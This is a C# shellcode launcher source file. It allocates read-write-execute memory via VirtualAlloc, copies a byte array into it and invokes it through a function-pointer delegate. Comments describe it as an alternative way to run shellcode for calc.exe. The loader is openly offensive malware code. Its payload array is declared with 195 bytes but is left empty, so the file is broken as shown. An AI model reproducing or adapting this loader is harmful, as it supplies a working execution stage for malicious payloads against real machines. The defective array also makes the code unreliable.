using System;
using System.Runtime.InteropServices;

namespace AltShellExec
{
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        // we can use an alternative method to run our shellcode: we can call it like a function.
        // source: https://tbhaxor.com/execute-unmanaged-code-via-c-pinvoke/

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void LikeAFunction();

        private static uint MEM_COMMIT = 0x1000;

        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // shellcode for calc.exe
            byte[] shellcode = new byte[195] {
             };

            // basically it's the same like the previus shellcodelauncher
            IntPtr fAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, fAddr, shellcode.Length);

            // but with this delagate we can call it like a function and execute the shellcode
            LikeAFunction program = Marshal.GetDelegateForFunctionPointer<LikeAFunction>(fAddr);
            program();

            return;
        }
    }
}

